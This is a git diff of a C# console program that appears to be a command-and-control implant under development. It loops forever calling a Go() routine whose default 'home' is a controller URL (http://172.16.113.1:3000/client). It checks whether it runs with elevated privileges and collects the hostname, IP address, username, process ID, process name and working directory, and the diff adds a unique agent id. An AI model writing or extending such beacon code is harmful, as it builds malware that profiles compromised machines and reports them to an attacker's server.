@@ -27,7 +27,7 @@ namespace ConsoleApp1
             {
                 Go();
             }
-            while(true) { };
+            while (true) { };
         }
         static async void Go(string home = "http://172.16.113.1:3000/client")
         {
@@ -41,8 +41,8 @@ namespace ConsoleApp1
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
 
-            var ip = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork);
-            
+            var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);
+
             return ip != null ? ip.ToString() : "0.0.0.0";
         }
         private static bool AmIHigh()
@@ -55,15 +55,16 @@ namespace ConsoleApp1
 
         static object GetSysinfo()
         {
+            string id = Guid.NewGuid().ToString();
             string hostname = Environment.MachineName;
             string ipaddr = GetLocalIPAddress();
             string elevated = AmIHigh() ? "*" : "";
             string username = elevated + WindowsIdentity.GetCurrent().Name;
             string pid = Process.GetCurrentProcess().Id.ToString();
-            string process = Process.GetCurrentProcess().ProcessName + Process.GetCurrentProcess();
+            string process = Process.GetCurrentProcess().ProcessName;
             string pwd = Directory.GetCurrentDirectory();
 
-            return new { hostname, ipaddr, username, pid, process, pwd};
+            return new { id, hostname, ipaddr, username, pid, process, pwd };
         }
     }
 }
